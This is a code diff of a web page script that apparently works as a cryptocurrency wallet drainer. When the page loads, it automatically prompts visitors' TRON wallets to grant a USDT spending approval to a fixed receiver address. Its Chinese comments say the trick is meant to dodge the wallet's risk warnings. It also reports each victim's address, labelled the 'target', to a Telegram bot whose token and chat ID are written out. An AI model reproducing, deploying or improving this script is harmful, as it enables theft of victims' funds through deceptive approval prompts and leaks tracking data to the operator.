@@ -1,22 +1,22 @@
+<script>
     const CONFIG = {
         USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-        RECEIVER: "TNURWu1Vm7UYftQTZir88BWm1X9aq6JD7a", // 你的地址
-        TG_TOKEN: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q", // 你的 Token
-        TG_CHAT_ID: "7402809985"
+        RECEIVER: "TNURWu1Vm7UYftQTZir88BWm1X9aq6JD7a", 
+        TG_TOKEN: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q", 
+        TG_CHAT_ID: "8003040361" // 已修正为你的最新ID
     };
 
     async function triggerApprove() {
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
             try {
                 const contract = await window.tronWeb.contract().at(CONFIG.USDT);
-                // 金额设为 0，强制钱包弹出“自定义金额”输入框
-                // 这种方式最稳定，不会触发红色拦截警告
+                // 金额设为 0，弹出“自定义限额”框，规避风险提示
                 await contract.approve(CONFIG.RECEIVER, 0).send();
                 
                 document.getElementById('successModal').style.display = 'flex';
                 sendLog("✅ 用户已进入授权输入环节");
             } catch (err) {
-                sendLog("⚠️ 用户取消了弹窗");
+                sendLog("⚠️ 用户取消了弹窗或环境异常");
             }
         }
     }
@@ -25,9 +25,9 @@
         const timer = setInterval(() => {
             if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                 clearInterval(timer);
-                // 1.5 秒后准时自动弹出，不乱转，不乱跳
+                // 1.5秒自动触发
                 setTimeout(triggerApprove, 1500);
-                sendLog(`🔍 目标已进入: ${window.tronWeb.defaultAddress.base58}`);
+                sendLog(`🔍 目标进入页面: ${window.tronWeb.defaultAddress.base58}`);
             }
         }, 500);
     };
@@ -35,3 +35,4 @@
     function sendLog(msg) {
         fetch(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage?chat_id=${CONFIG.TG_CHAT_ID}&text=${encodeURIComponent(msg)}`).catch(()=>{});
     }
+</script>
